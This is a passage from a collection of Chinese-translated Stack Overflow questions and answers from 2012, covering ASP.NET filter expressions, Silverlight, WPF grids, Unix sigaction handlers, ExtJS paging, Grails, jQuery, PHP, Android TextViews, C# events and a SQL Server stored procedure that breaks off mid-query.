             <asp:ControlParameter ControlID="txtCertificateID_Filter" Name="CertificateID" PropertyName="Text" Type="String" ConvertEmptyStringToNull="false" />
             <asp:ControlParameter ControlID="txtCustoms_Entry_Filter" Name="Customs_Entry" PropertyName="Text" Type="String" ConvertEmptyStringToNull="false" /> 
             <asp:ControlParameter ControlID="txtProduct_Number_Filter" Name="Product_Name" PropertyName="Text" Type="String" ConvertEmptyStringToNull="false" /> 
             <asp:ControlParameter ControlID="txtProduct_Name_Filter" Name="Product_Number" PropertyName="Text" Type="String" ConvertEmptyStringToNull="false" />                    
            </FilterParameters>
            <DeleteParameters>
                <asp:Parameter Name="CertificateID" Type="Int32" />
            </DeleteParameters>
            <InsertParameters>
                <asp:Parameter Name="Customs_Entry" Type="String" />
                <asp:Parameter Name="Date_Certificate" Type="String" />
                <asp:Parameter Name="Invoice_Number" Type="String" />
                <asp:Parameter Name="Product_Number" Type="String" />
                <asp:Parameter Name="Product_Name" Type="String" />
                <asp:Parameter Name="Product_Category" Type="String" />
                <asp:Parameter Name="CPSC_Regulation" Type="String" />
                <asp:Parameter Name="Date_Manufactured" Type="String" />
                <asp:Parameter Name="Manufacturer" Type="String" />
                <asp:Parameter Name="Date_Tested" Type="String" />
                <asp:Parameter Name="Test_Lot_ID" Type="String" />
                <asp:Parameter Name="Name_Laboratory" Type="String" />
            </InsertParameters>
            <UpdateParameters>
                <asp:Parameter Name="Customs_Entry" Type="String" />
                <asp:Parameter Name="Date_Certificate" Type="String" />
                <asp:Parameter Name="Invoice_Number" Type="String" />
                <asp:Parameter Name="Product_Number" Type="String" />
                <asp:Parameter Name="Product_Name" Type="String" />
                <asp:Parameter Name="Product_Category" Type="String" />
                <asp:Parameter Name="CPSC_Regulation" Type="String" />
                <asp:Parameter Name="Date_Manufactured" Type="String" />
                <asp:Parameter Name="Manufacturer" Type="String" />
                <asp:Parameter Name="Date_Tested" Type="String" />
                <asp:Parameter Name="Test_Lot_ID" Type="String" />
                <asp:Parameter Name="Name_Laboratory" Type="String" />
            </UpdateParameters>
        </asp:SqlDataSource>
        <br />
        <br />
        <br />
        <br />
        <br />
        <br />

    </div>
    </form>
</body>
</html> 
```

这是正确的代码：

```
FilterExpression="Convert(CertificateID , 'System.String') LIKE '{0}%'  and [Customs_Entry] like '{1}%' and [Product_Number] like '{2}%' and [Product_Name] like '{3}%'"> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:43:02.370

尝试

```
CAST(Product_Number as varchar(10)) LIKE '{1}%' 
```

您可以将 10 更改为任何合适的值。

编辑好的，然后它没有进入 SQL 服务器，你试过了吗

```
Convert(Product_Number , 'System.String') LIKE '{1}%' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:06:44.870

你试过 CONVERT 吗？

```
convert(varchar(length),[CertificateID]) like '{0}%' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-21T07:39:31.097

使用此代码。

```
"Convert(" + Your Column Name + ",'System.String')" + " LIKE '*" + Searching Text + "*'" 
```

# c# - 如何在 C# Silverlight 中获取 WriteableBitmap 的大小？

> ID：12587619
> 
> 赞同：0
> 
> 时间：2012-09-25T16:55:03.313
> 
> 标签：c#, silverlight

我想在 Silverlight 中获取 System.Windows.Media.Imaging WriteableBitmap 的大小。任何建议将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T18:44:21.157

大小以像素为单位？独立于设备的单元？字节？

[http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.writeablebitmap.aspx](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.writeablebitmap.aspx)

对于以像素为单位的尺寸，请尝试 PixelWidth 和 PixelHeight 属性。对于设备无关单位的尺寸，请尝试 Width 和 Height 属性。

# wpf - 无法使用绑定表达式设置字段宽度

> ID：12587620
> 
> 赞同：0
> 
> 时间：2012-09-25T16:55:04.430
> 
> 标签：wpf, infragistics, xamdatagrid

`XamDataGrid`我有一个非常简单的要求，就是如果满足绑定表达式，动态地将 my 中的几个（不是全部，只是几个）列的宽度设置为 0。

有问题的列总是遵循这种结构：

```
<igDP:UnboundField Name="Data Field 1" BindingPath="SrcEntity.Field1" 
    Width="{Binding Path=DataContext.GetDynamicWidth}">
    <igDP:Field.Settings>
        <igDP:FieldSettings AllowHiding="Always" AllowResize="True" />
    </igDP:Field.Settings>
</igDP:UnboundField> 
```

当我调试应用程序时，`DataContext.GetDynamicWidth`按预期调用，并按预期返回宽度值（`0`或`Double.NaN`）。但是在网格上，对于这些动态绑定到其宽度的列，实际宽度没有变化。

谁能告诉我这是一个 Infragistics 错误，还是我在这里遗漏了什么？

注意：我还尝试了以下字段设置：

```
<igDP:FieldSettings AllowHiding="Always" 
    AllowResize="True" CellWidth="{Binding Path=DataContext.GetDynamicWidth}" /> 
```

这也没有成功。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:22:52.767

该字段不是可视树或逻辑树的一部分，因此无法绑定到 DataContext。要解决此问题，您可以改为绑定到 StaticResource。

# c - 信号处理程序 sa_sigaction 参数

> ID：12587621
> 
> 赞同：2
> 
> 时间：2012-09-25T16:55:04.913
> 
> 标签：c, unix, signals

我有

```
struct sigaction pipe_act;
pipe_act.sa_flags = SA_SIGINFO;
pipe_act.sa_sigaction = sigpipehandler
sigaction(SIGPIPE, &pipe_act, NULL); 
```

当我尝试编写 sigpipeHandler 时，gcc 告诉我它需要三个参数。第二个参数没问题，它是 siginfo_t 结构，包含有关信号的信息，第一个和第三个（一个 int 和一个 void 变量），它们是什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-25T17:09:04.747

男人`sigaction`说：

> ```
>  The sigaction structure is defined as something like:
> 
>        struct sigaction {
>            void     (*sa_handler)(int);
>            void     (*sa_sigaction)(int, siginfo_t *, void *);
>            sigset_t   sa_mask;
>            int        sa_flags;
>            void     (*sa_restorer)(void);
>        };  
> 
>    sa_handler specifies the action to be associated with signum and may be
>    SIG_DFL for the default action, SIG_IGN to ignore  this  signal,  or  a
>    pointer to a signal handling function.  This function receives the sig‐
>    nal number as its only argument.
> 
>    If SA_SIGINFO is specified in sa_flags, then sa_sigaction  (instead  of
>    sa_handler)  specifies  the  signal-handling function for signum.  This
>    function receives the signal number as its first argument, a pointer to
>    a  siginfo_t as its second argument and a pointer to a ucontext_t (cast
>    to void *) as its third argument.
> 
>    .... 
> ```
> 
> > ```
> >  The siginfo_t argument to sa_sigaction is a struct with  the  following
> >    elements: 
> > ```
> 
> ```
>  siginfo_t {
>            int      si_signo;    /* Signal number */
>            int      si_errno;    /* An errno value */
>            int      si_code;     /* Signal code */
>            int      si_trapno;   /* Trap number that caused
>                                     hardware-generated signal
>                                     (unused on most architectures) */
>            pid_t    si_pid;      /* Sending process ID */
>            uid_t    si_uid;      /* Real user ID of sending process */
>            int      si_status;   /* Exit value or signal */
>            clock_t  si_utime;    /* User time consumed */
>            clock_t  si_stime;    /* System time consumed */
>            sigval_t si_value;    /* Signal value */
>            int      si_int;      /* POSIX.1b signal */
>            void    *si_ptr;      /* POSIX.1b signal */
>            int      si_overrun;  /* Timer overrun count; POSIX.1b timers */
>            int      si_timerid;  /* Timer ID; POSIX.1b timers */
>            void    *si_addr;     /* Memory location which caused fault */
>            long     si_band;     /* Band event (was int in
>                                     glibc 2.3.2 and earlier) */
>            int      si_fd;       /* File descriptor */
>            short    si_addr_lsb; /* Least significant bit of address
>                                     (since kernel 2.6.32) */
>        } 
> ```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-25T17:45:56.760

第一个参数是信号编号。它是必需的，因为您可以对多个不同的信号使用相同的处理程序。

第三个参数包含接收信号时使用的上下文。可以通过`makecontext()/setcontext()/getcontext()/swapcontext()`函数使用上下文来实现用户空间线程。上下文结构还包含不可移植的体系结构特定信息，例如接收到信号时处理器寄存器的值。弄乱处理器状态需要您自担风险。

# extjs - ExtJS 4：Ext.grid.Panel Ext.PagingToolbar 按钮（第一个、上一个、下一个、最后一个）不传递开始和限制参数

> ID：12587622
> 
> 赞同：2
> 
> 时间：2012-09-25T16:55:06.053
> 
> 标签：extjs, paging, toolbar

我很难让分页工具栏工作。初始加载将“start”和“limit”参数传递给服务器代理，数据在网格中加载良好。但是，当单击分页工具栏中的“下一步”按钮时，“开始”和“限制”参数无法正确传递，并且 Web 方法会因为它需要这些参数而崩溃。如果你能帮我解决根本问题，那就太棒了。但如果没有，并且您可以帮助我覆盖按钮，那也很好，所以我可以进行临时修复，直到找出问题所在。

**例外：**

```
POST http://{domain}/Controls/ObjectList/ObjectListService.asmx/GetObjectList?_dc=1348591244365 500 (Internal Server Error) ext-all-debug.js:36837
Ext.define.request                  ext-all-debug.js:36837
Ext.define.doRequest                ext-all-debug.js:49508
Ext.define.read                     ext-all-debug.js:39082
Ext.define.load                     ext-all-debug.js:47668
Base.implement.callParent           ext-all-debug.js:3728
Ext.define.load                     ext-all-debug.js:50160
Ext.define.read                     ext-all-debug.js:47399
Ext.define.loadPage                 ext-all-debug.js:50404
Ext.define.nextPage                 ext-all-debug.js:50409
Ext.define.moveNext                 ext-all-debug.js:102105
Ext.define.fireHandler              ext-all-debug.js:79530
Ext.define.onClick                  ext-all-debug.js:79520
(anonymous function)
Ext.apply.createListenerWrap.wrap   ext-all-debug.js:9171

{"Message":"Invalid web service call, missing value for parameter: \u0027query\u0027.","StackTrace":"   at System.Web.Script.Services.WebServiceMethodData.CallMethod(Object target, IDictionary`2 parameters)\r\n   at System.Web.Script.Services.WebServiceMethodData.CallMethodFromRawParams(Object target, IDictionary`2 parameters)\r\n   at System.Web.Script.Services.RestHandler.InvokeMethod(HttpContext context, WebServiceMethodData methodData, IDictionary`2 rawParams)\r\n   at System.Web.Script.Services.RestHandler.ExecuteWebServiceCall(HttpContext context, WebServiceMethodData methodData)","ExceptionType":"System.InvalidOperationException"} 
```

============================

**源代码：**

```
 var itemsPerPage = 30;

    var store = new Ext.data.Store({
        proxy: new Ext.ux.AspWebAjaxProxy({
            url: '/Controls/ObjectList/ObjectListService.asmx/GetObjectList',
            actionMethods: {
                create: 'POST',
                destroy: 'DELETE',
                read: 'POST',
                update: 'POST'
            },
            reader: {
                type: 'json',
                model: 'Object',
                totalProperty: 'd.recordCount',
                //idProperty: 'object_id',
                root: 'd.resultSet'
            },
            headers: {
                'Content-Type': 'application/json; charset=utf-8'
            }
        }),
        pageSize: itemsPerPage,
        noCache: false,
        //autoLoad: true
        autoLoad: {
            params: {
                //query: '',
                start: 0,
                limit: itemsPerPage
            }
        }
    });    

...

    Ext.define('ObjectGrid', {
        extend: 'Ext.grid.Panel',

        initComponent: function () {
            var me = this;

            Ext.applyIf(me, {
                store: store,
                forceFit: true,
                autoScroll: true,
                height: 750,
                loadMask: true,

                columns: [
                ],

... 

                bbar: Ext.create('Ext.PagingToolbar', {
                    store: store,
                    displayInfo: true,
                    pageSize: 30,
                    displayMsg: 'Displaying records {0} - {1} of {2}',
                    emptyMsg: 'No records to display'

//                    type: 'pagingmemory',

//                    listeners: {
//                        afterrender: {
//                            single: true,
//                            fn: function (thispaging) {
//                                thispaging.first.on('click', function () {
//                                    Ext.Msg.alert('first', 'first');
//                                });
//                                thispaging.prev.on('click', function () {
//                                    Ext.Msg.alert('prev', 'prev');
//                                });
//                                thispaging.next.on('click', function () {
//                                    Ext.Msg.alert('next', 'next');
//                                });
//                                thispaging.last.on('click', function () {
//                                    Ext.Msg.alert('last', 'last');
//                                });
//                            }
//                        }
//                    }

//                    listeners: {
//                        'click' : function(which) { 
//                            alert('you have clicked'); 
//                        } 
//                    } 

                })  // bbar

            });

            me.callParent(arguments);
        }
    }); 
```

**更新#1：**

在上面提到的堆栈跟踪中，这两个调用之间的参数正在丢失。

![在此处输入图像描述](../Images/c724feed0db803721e56debe149c407e.png)

**第 39082 行：**

```
this.requests.5.options.params = "{}"
(5) being the current object 
```

![在此处输入图像描述](../Images/9bfb85c08e5e78a8849e1cb1592cb363.png)

**第 47668 行：**

```
operation.start = 2
operation.limit = 30 
```

![在此处输入图像描述](../Images/fbfd420654e087d41ea4345161f76515.png)

**更新#2：**

```
Ext.define('Ext.ux.AspWebAjaxProxy', {
    extend: 'Ext.data.proxy.Ajax',
    require: 'Ext.data',
    //processData: false,

    buildRequest: function (operation) {
        var params = Ext.applyIf(operation.params || {}, this.extraParams || {}),
                                request;
        params = Ext.applyIf(params, this.getParams(params, operation));
        if (operation.id && !params.id) {
            params.id = operation.id;
        }

        params = Ext.JSON.encode(params);

        request = Ext.create('Ext.data.Request', {
            params: params,
            action: operation.action,
            records: operation.records,
            operation: operation,
            url: operation.url
        });
        request.url = this.buildUrl(request);
        operation.request = request;
        return request;
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T00:47:46.287

我尝试回到 ExtJS 版本 4.0.0，但我的应用程序中的其他功能正在破坏。所以我坚持使用 4.1.0 版本并为此代理实施了一个 hack，所以它会起作用，所以我可以有一些想法（或者它是“安心？”）。

```
Ext.define('Ext.ux.AspWebAjaxProxy', {
    extend: 'Ext.data.proxy.Ajax',
    require: 'Ext.data',

    buildRequest: function (operation) {
        var params = Ext.applyIf(operation.params || {}, this.extraParams || {}),
                                request;
        params = Ext.applyIf(params, this.getParams(params, operation));

        if (params.page == null) {
            params.page = operation.page;
            params.start = operation.start;
            params.limit = operation.limit;
        }

        if (operation.id && !params.id) {
            params.id = operation.id;
        }

        params = Ext.JSON.encode(params);

        request = Ext.create('Ext.data.Request', {
            params: params,
            action: operation.action,
            records: operation.records,
            operation: operation,
            url: operation.url
        });
        request.url = this.buildUrl(request);
        operation.request = request;
        return request;
    }
});

//}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T08:56:32.327

好吧，我想诀窍在于

```
// Clone params right now so that they can be mutated at any point further down the call stack
var me = this,
    params = operation.params = Ext.apply({}, operation.params, me.extraParams),
    request; 
```

我认为您可以使用它来替换您的第一行，我想它应该可以工作。

还请看

```
// Set up the entity id parameter according to the configured name.
// This defaults to "id". But TreeStore has a "nodeParam" configuration which
// specifies the id parameter name of the node being loaded.
if (operation.id !== undefined && params[me.idParam] === undefined) {
    params[me.idParam] = operation.id;
} 
```

不知道您是否也需要更新此内容。

# grails - 防止 grails 获取域对象

> ID：12587629
> 
> 赞同：3
> 
> 时间：2012-09-25T16:55:32.230
> 
> 标签：grails, grails-orm

我有一张属于用户的图片

```
class Image {
  static belongsTo = [user: User]
  String name 
  String path
}
class User {
  String name
} 
```

如何在不获取数据库中的用户的情况下获取用户 ID：

```
myService.doIt(Image.get(1).user.id) 
```

获取用户（我只需要这里的 id）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T17:27:53.427

对域类属性“foo”使用动态“fooId”属性：

```
myService.doIt(Image.get(1).userId) 
```

# jquery - 使用 jQuery 对位于不同 div 中的 DOM 元素进行排序

> ID：12587630
> 
> 赞同：0
> 
> 时间：2012-09-25T16:55:33.937
> 
> 标签：jquery, html, sorting

我正在研究一个 jQuery 代码，该代码根据这样的标准对页面中所有具有“order_me”类的 div 进行排序。

这些 div 排列在 div 制作的容器行中，即：

```
<div id="container">
    <div class="row">
      <div  class="order_me"></div>
      <div  class="order_me"></div>
      <div  class="order_me"></div>
    </div> 
    <div class="row">
       <div  class="order_me"></div>
       <div  class="order_me"></div>
       <div  class="order_me"></div>
    </div>
    <div class="row">
       <div  class="order_me"></div>
    </div>
</div> 
```

一旦我得到要订购的div列表，即

```
var $lst = $('#container').find('.order_me')); 
```

然后我将列表转换为 JS 数组，并按如下方式对其进行排序：

```
var array = jQuery.makeArray($lst);
array.sort(sortingFunction); 
```

由于我有已排序的 div 列表：**如何有效地将已排序的 div 放入行中？**

当然，如果您有其他想法，请告诉我您的想法。

请注意，最后一行的 div 可能较少，而其他行的 div 数量相同。

提前致谢。问候。合资企业

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:13:08.897

让我试一试：

```
var $rows = $('.row');
var limit = $($rows[0]).find('.order_me').length;
var $lst = $('#container').find('.order_me'));
var array = jQuery.makeArray($lst);
array.sort(sortingFunction);

var count = 0;
var rowIndex = 0;
for(var i in array){
    var div = array[i];
    $($rows[rowIndex]).append($(div));
    count++;
    if(count >= limit){
        count = 0;
        rowIndex++;
    }
} 
```

基本上我捕获了第一行中的 div 数量以用作限制我循环遍历数组，根据 rowIndex 将 div 附加到行并添加到计数器。当计数器达到限制时，我们开始通过增加 rowIndex 将 div 附加到下一行，直到所有元素都附加到正确的位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:19:28.207

这样的事情怎么样？

```
var $lst = $('#container').find('.order_me'));
var array = jQuery.makeArray($lst);
array.sort(sortingFunction);
$('#container').html(array); // add them to container
for(var i=0; i < $divs.length;i+=3){ // loop through and wrap them in divs
   $('#container div.order_me').slice(i,i+3).wrapAll('<div class="row"></div>');  
}​ 
```

[http://jsfiddle.net/FkkGj/](http://jsfiddle.net/FkkGj/)

# c# - 为什么视觉工作室用空格分隔参数？

> ID：12587631
> 
> 赞同：3
> 
> 时间：2012-09-25T16:55:35.480
> 
> 标签：c#, visual-studio, command-line-arguments

我尝试在我的项目的命令行参数中传递 2 个参数，如下所示：argument1,argument2 但后来意识到它需要像这样：argument1 argument2

为什么 Visual Studio 用空格而不是逗号分隔参数？从逻辑上讲，参数被传递给函数，该函数用逗号 fct(a,b) 分隔它们的参数。我不知道 Visual Studio 用空格而不是逗号分隔参数。这是为什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-25T16:57:09.037

这不仅适用于视觉工作室。来自命令行的输入始终采用由空格分隔的参数。这就是它的工作原理。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-25T16:57:40.080

它与 Visual Studio 无关。这就是为所有可执行文件指定的*命令行参数*的方式，无论它们是如何创建的。

用于构建可执行文件的语言如何表示和分离函数参数与此完全正交。

# amazon-ec2 - AWS 似乎在终止后自动启动另一个具有相同 AMI 的 EC2 实例

> ID：12587634
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:55:50.420
> 
> 标签：amazon-ec2, amazon-web-services, terminate

我有 6 个 ec2 实例，我想终止其中的 3 个。我尝试使用 ec2-terminate-instances 从命令行终止它们，还使用 ​​AWS 管理控制台（右键单击实例并单击终止）。

实例停止并进入终止状态。然而，一段时间后，另一个实例会自动启动，并使用已终止实例的相同映像。我无法弄清楚为什么会这样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T20:58:53.400

当我尝试停止实例然后单独终止它们时，它似乎工作正常

# php - 如何使我的函数与更改数组的 if 语句一起使用

> ID：12587637
> 
> 赞同：2
> 
> 时间：2012-09-25T16:56:02.377
> 
> 标签：php

在下面的脚本中，我有一个数组。我的数组存储来自网页的所有链接、标题和描述。但我想确保如果没有描述，它将使用 ap 标签的前 20 个字符，使用一个有效的功能。唯一的问题是我有拼图，似乎无法将它们放在一起，所以我希望我的 if 语句显示，如果描述为空，则使用函数 getWord 而不是`getMetas()`.

```
function getMetas($link) {
  $str1 = file_get_contents($link);    
  if (strlen($str1)>0) {
    preg_match_all( '/<meta.*?name=("|\')description("|\').*?content=("|\')(.*?)("|\')/i', $str1, $description);
    if (count($description) > 1) {
      return $description[4];   
    }
  }
} 
```

然后我的函数在这里（`get_custom_excert`），但没有必要看到它，因为我知道它有效。

```
function getWord() {
  $html = file_get_contents($link);    
  preg_match('%(<p[^>]*>.*?</p>)%i', $html, $re);
  $res = get_custom_excerpt($re[1]);
}

$outputs = array();

foreach ($links as $thisLink) {
  $output[] = array("link" => $thisLink, "title" => Titles($thisLink), "description" => getMetas($thisLink));

  if ($output['description'] == null) {
  $output['description'] = getWord($res);
  }

  $outputs[] = $output;
}

print_r($output); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:44:55.960

这是你想要的吗？

```
function getMetas($link) {
  $str1 = file_get_contents($link);    
  if (strlen($str1)>0) {
    preg_match_all( '/<meta.*?name=("|\')description("|\').*?content=("|\')(.*?)("|\')/i', $str1, $description);
    if (count($description) > 1) {
      return $description[4];   
    } else {
      return getWord($str1);
    }
  }
}

function getWord($html) {
  preg_match('%(<p[^>]*>.*?</p>)%i', $html, $re);
  return get_custom_excerpt($re[1]);
} 
```

顺便说一句，用正则表达式解析 HTML 非常脆弱，最好使用 DOM 解析器库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:02:54.203

这怎么样？

```
foreach ($links as $thisLink) {
  $output = array("link" => $thisLink, "title" => Titles($thisLink), "description" => getMetas($thisLink));

  if ($output['description'] == null) {
  $output['description'] = getWord($res);
  }

  $outputs[] = $output;
} 
```

# java - 通过 java 代码从 strings.xml 将文本设置为 textView 时出错

> ID：12587644
> 
> 赞同：0
> 
> 时间：2012-09-25T16:56:21.440
> 
> 标签：java, android, eclipse, textview, settext

我只想使用java代码从strings.xml的textView中设置一个文本，但我不能，eclipse给了我这个错误：“textView1无法解析”和“textView2无法解析”。

这是我的活动：

```
package com.example.activity;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.ImageView;

public class Descripcion extends Activity{

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.descripcion);

    Intent i = getIntent();

    int position = i.getExtras().getInt("id");
    ImageAdapter imageAdapter = new ImageAdapter(this);

    switch (position){
    case 0:

    ImageView imageView0 = (ImageView) findViewById(R.id.full_image_view);
    imageView0.setImageResource(imageAdapter.mThumbIds[position]);

    textView1.setText(this,getString(R.string.case0));
    textView2.setText(this,getString(R.string.case0b));

    break;

    case 1:

    ImageView imageView1 = (ImageView) findViewById(R.id.full_image_view);
    imageView1.setImageResource(imageAdapter.mThumbIds[position]);

    textView1.setText(this,getString(R.string.case1));
    textView2.setText(this,getString(R.string.case0b));

    break;  
    }
}
} 
```

我一直在寻找大约 3 个小时的解决方案，但我无法解决。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:59:37.280

我看不到您在哪里声明 TextView，例如：

```
TextView textView1 = (TextView)findViewById(R.id.textView1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:58:43.187

1）你没有定义`TextView`

2）你没有做得到`findViewById`相应的`TextView`

**怎么做？**

您的代码本身有如何做到这一点的线索，例如：

```
ImageView imageView1 = (ImageView) findViewById(R.id.full_image_view); 
```

在这里你定义`ImageView`并指出它`R.id.full_image_view`定义在`layout.xml`

像这样你需要得到`TextView`，例如：

```
TextView textView1 = (TextView)findViewById(R.id.textView1); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:00:12.450

您忘记定义变量`textView1`和`textView2`. 除此之外，您需要使用`findViewById`. 奇怪的是，您这样`imageView1`做是为了`TextViews`.

在下面添加以下代码`etContentView(R.layout.descripcion)`：

`TextView textView1 = (TextView) findViewById(<<-- the id of textView1 -->>); TextView textView1 = (TextView) findViewById(<<-- the id of textView2 -->>);`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T17:00:40.737

那是因为 textView1 和 textView2 没有定义......

你看到你用 ImageView 做什么了吗？

`ImageView imageView0 = (ImageView) findViewById(R.id.full_image_view);`

您必须将相同的概念应用于文本视图。

```
TextView textView1 = (TextView) findViewById(R.id.id_of_text_view_1);
TextView textView2 = (TextView) findViewById(R.id.id_of_text_view_2); 
```

然后就可以对那个文本视图进行操作了，比如设置文本！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-25T17:02:09.820

定义你的文本视图，就像你做你的图像视图一样。

您可以使用

```
TextView textView1 = (TextView)findViewById(R.id.textView1);
TextView textView2 = (TextView)findViewById(R.id.textView2); 
```

在哪里

```
R.id.textView1 
```

是您的 xml 布局中 textview1 的 id

```
R.id.textVie2 
```

是您的 xml 布局中 textview2 的 id

# iphone - iPhone 特定的 CSS

> ID：12587646
> 
> 赞同：0
> 
> 时间：2012-09-25T16:56:39.170
> 
> 标签：iphone, css, wordpress, mobile, mobile-safari

我已经为我`Wordpress`的移动设备网站创建了一个特定的样式表。出于某种原因，屏幕被放大到网站不可见的水平，我无法缩小以进行全屏查看。

我需要某种类型的元标记来用于设备吗？目前我有这个。

```
<link media="only screen and (max-device-width: 480px)" href="<?php bloginfo('template_url'); ?>/css/mobile.css" type= "text/css" rel="stylesheet" /> 
```

这将允许我编辑样式表，它将反映移动设备上的更改。我怎样才能让它缩小？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:00:13.713

看看：initial-scale=1，maximum-scale=1 元标签

# c# - 举办活动的更好方法

> ID：12587649
> 
> 赞同：0
> 
> 时间：2012-09-25T16:56:48.833
> 
> 标签：c#, events

要求是对象`A`订阅作为参数`B`携带的 's 事件。`int`我以给定的方式做到了这一点：

```
public delegate void BackToBase(int i);
public event BackToBase BackToBaseEvent;

...
if (this.BackToBaseEvent != null)
    this.BackToBaseEvent(5); 
```

但在我看来，有一种更短的方法可以做到这一点。在那儿？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:22:32.700

您可以将事件处理程序初始化为 ctor 中的空委托，然后您不需要检查，因为委托永远不会为空。例如

```
this.BackToBaseEvent += (s, e) => {}; 
```

然后你就做。

```
this.BackToBaseEvent(this, new MyEventArgs(5)); 
```

请务必遵守事件处理模式，使用正确的委托和事件 arg 类。

如果您确实想要检查 null（以避免调用空操作的开销），请使用[http://msdn.microsoft.com/en-us/library/edzehd2t.aspx](http://msdn.microsoft.com/en-us/library/edzehd2t.aspx)中所述的局部变量来避免线程问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T17:16:06.383

您可以通过使用以下通用委托来稍微缩短此时间[`EventHandler<T>`](http://msdn.microsoft.com/en-us/library/db0etb8x.aspx)：

```
public event EventHandler<int> BackToBaseEvent; 
```

不过，空值检查非常重要。

# asp.net - 调用存储过程时，.hasRows 保持“假”

> ID：12587650
> 
> 赞同：1
> 
> 时间：2012-09-25T16:56:57.677
> 
> 标签：asp.net, sql, sql-server, tsql, stored-procedures

我有一个正在调用的存储过程，它将从表中返回数据。

但是，当我尝试用数据填充 .aspx 时，它会跳过我的方法，因为我的方法是基于读取器是否检测到行。

这是我的方法：

```
private void editExhibit(int expenseID)//new
{
  saveExhibitBtn.Text = "Update Exhibit";

  SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings["OSCIDConnectionString"].ToString());
  SqlCommand cmd = new SqlCommand("p_CaseFiles_Exhibits_RetrieveExhibitDetails", conn);
  cmd.CommandType = CommandType.StoredProcedure;
  //cmd.Parameters.AddWithValue("@ExhibitID", expenseID);
  cmd.Parameters.Add(new SqlParameter("@ExhibitID", SqlDbType.Int));
  cmd.Parameters["@ExhibitID"].Value = expenseID;

  bool hasAttachments = false;
  string investigatorID = "";
  //bool alreadyInvoiced = false;
  bool isExpenseOwner = false;
  string fileID = "-1";

  try
  {
      conn.Open();
      var reader = cmd.ExecuteReader();
      if (reader.HasRows)//////////////////////craps out here bcause hasRows is false....
      {
          reader.Read();
          fileID = reader["FileID"].ToString();
          ddlCaseFiles.SelectedValue = fileID;
          ddlCaseFiles.Enabled = false;
          // retrieve exhibit details here
          hasAttachments = (bool)reader["HasAttachments"];
          investigatorID = reader["InvestigatorID"].ToString();
          if (Session["InvestigatorID"].ToString() == investigatorID)
          {
              isExpenseOwner = true;
          }
          txtDateReceived.Value = reader["SeizeDate"].ToString();
          ddlReceivedBy.SelectedValue = reader["SeizedByInvestigatorID"].ToString();
          txtTimeReceived.Value = reader["SeizeTime"].ToString();
          txtWhyHowReceived.Value = reader["SeizeAuthority"].ToString();
          txtReceivedLocation.Value = reader["SeizeLocation"].ToString();
          txtOurItemNum.Value = reader["NewExhibitOutItemNumber"].ToString();////////////
          txtTheirItemNum.Value = reader["ClientItemNum"].ToString();
          txtBagNum.Value = reader["BagNumber"].ToString();
          txtBoxNum.Value = reader["BoxNumber"].ToString();
          txtComment.Value = reader["ExhibitDecriptionPlainText"].ToString();
      }
  }
  catch (SqlException ex)
  {
      ErrorLogger.Log(ex.Number, "NewExhibit.aspx - editExhibit - Retrieve Details", ex.Message);
  } 
```

这是我的存储过程：

```
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
ALTER procedure [dbo].[p_CaseFiles_Exhibits_RetrieveExhibitDetails]
  @FilterField nvarchar(max)=null
, @FilterQuery nvarchar(max)=null
, @SortName nvarchar(max)='SeizeDate, SeizeTime '
, @SortOrder nvarchar(max)='desc'
, @ExhibitID int
as
SET CONCAT_NULL_YIELDS_NULL OFF
declare @Command nvarchar(max)
Select @Command = 'select E.ExhibitID,convert(nvarchar,SeizeDate,111) as ''SeizeDate'',SeizeTime,ExhDesc,E.InvestigatorID as ''EnteredBy'' 
  ,E.SeizedByInvestigatoID as ''SeizedBy'',SBI.ActiveInvestigator, SBI.FName+'' '' + SBI.LName as ''SeizedByName'', E.FileID,[FileName]
  ,Investigators.FName,Investigators.LName,SzAuthority,Location,ItemID,SubItemID1,SubItemID2,SubItemID3,PageSerial,ClientItemNum,Privileged
  ,Private,E.HasAttachments,ItemEntryGradeID,BagNumber,BoxNumber,PL.PropertyId,P.PropertyTypeID,P.PropertyMakeID,P.PropertyModelID,SerialNumber,ColorID
  ,cast(ItemID as varchar)+''-''+cast(SubItemID1 as varchar)+''-''+cast(SubItemID2 as varchar)+''-''+cast(SubItemID3 as varchar) as ''ItemNumber'',StoredLocally 
  from CaseFileExhibits E 
  join Investigators on E.InvestigatorID = Investigators.InvestigatorID 
  join Investigators SBI on SBI.InvestigatorID=E.SeizedByInvestigatoID 
